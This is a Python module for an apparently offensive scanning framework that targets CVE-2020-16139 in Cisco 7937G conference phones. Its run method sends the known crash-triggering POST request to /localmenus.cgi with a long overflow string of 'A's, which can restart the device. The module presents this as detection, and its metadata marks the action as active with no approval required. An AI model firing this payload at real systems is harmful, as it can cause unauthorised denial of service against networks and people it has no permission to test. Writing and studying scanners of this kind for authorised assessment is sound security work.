#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Cisco Unified IP Conference Station 7937G 1-4-4-0 through 1-4-5-7 allows attackers to restart the device remot."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Cisco Unified IP Conference Station 7937G - Denial-of-Service Detection',
        'description': 'Cisco Unified IP Conference Station 7937G 1-4-4-0 through 1-4-5-7 allows attackers to restart the device remotely via specially crafted packets that can cause a denial-of-service condition. Note: We cannot prove this vulnerability exists. Out of an abundance of caution, this CVE is being assigned to better serve our customers and ensure all who are still running this product understand that the product is end of life and should be removed or upgraded.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'dos', 'cisco', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://packetstormsecurity.com/files/158819/Cisco-7937G-Denial-Of-Service.html',
            'https://www.cisco.com/c/en/us/products/collateral/collaboration-endpoints/unified-ip-phone-7940g/end_of_life_notice_c51-729487.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-16139',
            'https://github.com/anonymous364872/Rapier_Tool',
            'https://github.com/blacklanternsecurity/Cisco-7937G-PoCs',
        ],
        'cve': 'CVE-2020-16139',
    }

    def run(self):
        path = '/localmenus.cgi?func=609&rphl=1&data=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
        r = self.http_request(method='POST', path=path, allow_redirects=False, data='')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',)
        header_any = ('application/xml',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='high', reason='Cisco Unified IP Conference Station 7937G - Denial-of-Service detected', path=path)
            return True
        return False

